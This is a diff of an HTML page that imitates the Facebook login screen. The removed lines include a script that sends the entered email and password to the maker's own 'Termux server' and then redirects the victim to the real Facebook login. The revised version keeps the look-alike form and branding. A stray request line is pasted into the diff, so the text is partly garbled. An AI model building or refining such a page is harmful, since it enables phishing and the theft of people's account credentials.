@@ -1,7 +1,10 @@
-<!DOCTYPE html>
-<html>
+i like this is style can so make it '<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>Facebook Login</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
 <style>
 
 *{
@@ -114,48 +117,30 @@ font-size:15px;
 <body>
 
 <div class="container">
-  <div class="login-box">
-   <a href="http://https://play.google.com/store/apps/details?id=com.facebook.katana&hl=en-US&pli=1"><div class="top-text">Get Facebook for Android and browse faster.</div></a>
 
-    <div class="language">English (US)</div>
+<div class="top-text">Get Facebook for Android and browse faster.</div>
 
-    <div class="logo">f</div>
-    <!-- Email and Password fields -->
-     <input class="input-box" type="text" placeholder="Mobile number or email">
-     <input class="input-box" type="password" placeholder="Password">
-    
-    <button class="login-btn" onclick="send()">Log In</button>
-    
-    <!-- Additional links like Facebook -->
-     <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzcyOTU1OTAzfQ%3D%3D&ars=facebook_login" class="forgot">Forgot password?</a>
+<div class="language">English (US)</div>
+
+<div class="logo">f</div>
+
+<form>
+
+<input class="input-box" type="text" placeholder="Mobile number or email">
+
+<input class="input-box" type="password" placeholder="Password">
+
+<button class="login-btn">Log in</button>
+
+</form>
+
+<a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzcyOTU1OTAzfQ%3D%3D&ars=facebook_login" class="forgot">Forgot password?</a>
 
 <a href="https://www.facebook.com/reg/?entry_point=login&next=" class="create">Create new account</a>
 
 <div class="meta">Meta</div>
+
 </div>
 
-<script>
-async function send() {
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
-
-  // Send data to your Termux server
-  await fetch("/send", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ email, password })
-  });
-
-  // Optional: clear inputs
-  document.getElementById("email").value = "";
-  document.getElementById("password").value = "";
-
-  // Redirect user to the real Facebook login page
-  window.location.href = "https://www.facebook.com/login.php";
-}
-</script>
-
 </body>
-</html>
+</html>'
